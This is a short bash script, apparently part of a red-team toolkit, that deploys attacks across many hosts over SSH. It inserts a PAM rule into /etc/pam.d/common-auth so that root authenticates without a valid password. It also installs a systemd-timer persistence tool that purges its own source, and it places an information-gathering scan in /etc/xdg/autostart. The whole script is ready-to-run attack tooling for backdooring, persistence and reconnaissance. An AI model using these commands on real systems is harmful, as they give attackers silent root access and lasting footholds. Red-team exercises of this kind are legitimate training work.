#!/bin/bash
set -e 

multissh -c passwordAuth.yaml run "sed -i '1s/^/auth sufficient pam_succeed_if.so user = root\n/' /etc/pam.d/common-auth"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
# Deploying Jack's SystemdTimer persistence
./deploy_tool.sh passwordAuth.yaml "${SCRIPT_DIR}"/CDT-Red-Team-Tools/SystemdTimer-LinuxPersistenceStash/ /media "./install.sh --purge-source"

./deploy_tool.sh passwordAuth.yaml "${SCRIPT_DIR}"/CDT-Red-Team-Tools/Info-Gathering/ /etc/xdg/autostart "sudo python3 FullInfoScan.py"